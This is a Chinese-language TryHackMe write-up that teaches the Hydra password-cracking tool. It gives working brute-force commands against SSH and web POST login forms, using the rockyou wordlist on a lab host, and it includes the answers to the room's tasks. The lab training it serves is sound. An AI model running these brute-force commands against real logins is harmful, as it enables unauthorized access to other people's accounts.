---
{"dg-publish":true,"permalink":"/tryhackme/tryhackme-hydra-基础知识/","title":"tryhackme-hydra 基础知识","tags":["linux","tryhackme"]}
---

![t](/img/user/images/tryhackme-hydra-基础知识/title.png)

Hydra是啥
Hydra是一款暴力在线密码破解程序，一种快速系统登录密码“破解”工具。

SSH
hydra -l <username> -P <full path to pass> 10.10.228.178 -t 4 ssh

| 选项 | 描述 |
|------|------|
| -l   | 指定登录的（SSH）用户名 |
| -P   | 表示密码列表 |
| -t   | 设置要生成的线程数 |

例如， hydra -l root -P passwords.txt 10.10.228.178 -t 4 ssh将使用以下参数运行：

Hydra将root用作 ssh用户名
passwords.txt 它将尝试文件中的密码
将会有四个线程并行运行，如下所示 -t 4



发布 Web 表单
我们也可以使用Hydra来暴力破解 Web 表单。必须知道它发出的是哪种类型的请求；通常使用 GET 或 POST 方法。您可以使用浏览器的网络选项卡（在开发人员工具中）查看请求类型或查看源代码。

```
sudo hydra <username> <wordlist> 10.10.228.178 http-post-form "<path>:<login_credentials>:<invalid_response>"
```

| 选项            | 描述 |
|----------------|------|
| -l            | （Web 表单）登录的用户名 |
| -P            | 要使用的密码列表 |
| http-post-form | 表单类型为 POST |
| <path>        | 登录页面 URL，例如 login.php |
| <login_credentials> | 用于登录的用户名和密码，例如 `username=^USER^&password=^PASS^` |
| <invalid_response>  | 登录失败时的部分响应 |
| -V            | 每次尝试的详细输出 |


下面是一个更具体的Hydra命令示例，用于强制执行 POST 登录表单：
```
hydra -l <username> -P <wordlist> 10.10.228.178 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
登录页面只有/，即主IP地址。
这username是输入用户名的表单字段
指定的用户名将替换^USER^
这password是输入密码的表单字段
提供的密码将取代^PASS^
最后，F=incorrect是登录失败时服务器回复中出现的字符串



![task1](/img/user/images/tryhackme-hydra-基础知识/task1.png)

第一问
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.228.178 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

在破解的时候要注意路径 是/login 

![task1](/img/user/images/tryhackme-hydra-基础知识/pass.png)

![task1](/img/user/images/tryhackme-hydra-基础知识/flag.png)

第二问
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.228.178 ssh
```

![task1](/img/user/images/tryhackme-hydra-基础知识/butterfly.png)